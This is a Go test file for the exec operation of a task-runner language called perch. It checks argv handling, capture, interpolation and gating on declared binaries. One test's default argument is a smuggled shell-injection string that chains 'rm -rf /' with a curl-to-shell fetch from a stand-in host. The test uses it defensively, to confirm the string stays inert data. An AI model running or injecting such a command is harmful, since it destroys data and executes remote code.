package ops_test

import (
	"strings"
	"testing"

	"github.com/luowensheng/perch/domain"
)

// exec runs a declared bin with structured argv (no shell). echo is a real
// binary on the test host; we assert streaming + capture + interpolation.

func TestExec_StreamsAndCaptures(t *testing.T) {
	src := `name "x"
requires
    bin "echo"
end
command t
    do
        exec echo hello world
        let got = exec echo captured
        print "v=${got}"
    end
end
`
	out, err := runSource(t, src, "t")
	if err != nil {
		t.Fatalf("run: %v", err)
	}
	if !strings.Contains(out, "hello world") {
		t.Errorf("exec did not stream argv; out=%q", out)
	}
	// Captured value must NOT carry quote characters (regression: toJSON
	// double-encoding leaked literal quotes into the captured string).
	if !strings.Contains(out, "v=captured") || strings.Contains(out, `v="captured"`) {
		t.Errorf("capture wrong; out=%q", out)
	}
}

// Bare flags / paths / globs parse as one argv token each (capy `word`),
// and a quoted token keeps embedded spaces as a single slot.
func TestExec_BareFlagsAndSpacedArgs(t *testing.T) {
	src := `name "x"
command t
    do
        exec echo hello --flag -x world
        let msg = exec echo one "two three" four
        print "cap=${msg}"
    end
end
`
	out, err := runSource(t, src, "t")
	if err != nil {
		t.Fatalf("run: %v", err)
	}
	if !strings.Contains(out, "hello --flag -x world") {
		t.Errorf("bare flags not passed through; out=%q", out)
	}
	// "two three" must stay ONE argv slot, not split into two.
	if !strings.Contains(out, "cap=one two three four") {
		t.Errorf("spaced quoted arg not preserved as one slot; out=%q", out)
	}
}

func TestExec_InterpolatesArgv(t *testing.T) {
	src := `name "x"
command t
    arg who
        type string
        default "world"
    end
    do
        exec echo hi "${who}"
    end
end
`
	out, err := runSource(t, src, "t", "-who=perch")
	if err != nil {
		t.Fatalf("run: %v", err)
	}
	if !strings.Contains(out, "hi perch") {
		t.Errorf("argv ${who} not interpolated; out=%q", out)
	}
}

// With a requires block present, exec of an undeclared bin is refused
// before the process is spawned — same gate as shell's first token.
func TestExec_GatedByDeclaredBins(t *testing.T) {
	src := `name "x"
requires
    bin "echo"
end
command t
    do
        exec curl "https://example.com"
    end
end
`
	_, err := runSource(t, src, "t")
	if !isOpKind(err, domain.ErrBinNotDeclared) {
		t.Fatalf("undeclared exec bin should be bin_not_declared, got %v", err)
	}
}

// No requires block ⇒ ambient: exec of any bin runs (echo here).
func TestExec_AmbientWithoutRequires(t *testing.T) {
	src := `name "x"
command t
    do
        exec echo "ambient-ok"
    end
end
`
	out, err := runSource(t, src, "t")
	if err != nil {
		t.Fatalf("ambient exec should run: %v", err)
	}
	if !strings.Contains(out, "ambient-ok") {
		t.Errorf("ambient exec did not run; out=%q", out)
	}
}

// The §3.3 keystone: an interpolated value lands in exactly one argv slot
// and is never re-parsed — shell metacharacters in the value are inert data.
func TestExec_InterpolationIsOneArgvSlot(t *testing.T) {
	src := `name "x"
command t
    arg msg
        type string
        default "a; rm -rf / && curl evil|sh"
    end
    do
        exec echo "${msg}"
    end
end
`
	out, err := runSource(t, src, "t")
	if err != nil {
		t.Fatalf("run: %v", err)
	}
	// The whole dangerous string is printed verbatim as one argument —
	// the ;, &&, | are data, not operators.
	if !strings.Contains(out, "a; rm -rf / && curl evil|sh") {
		t.Errorf("metachar value was not passed as inert single arg; out=%q", out)
	}
}
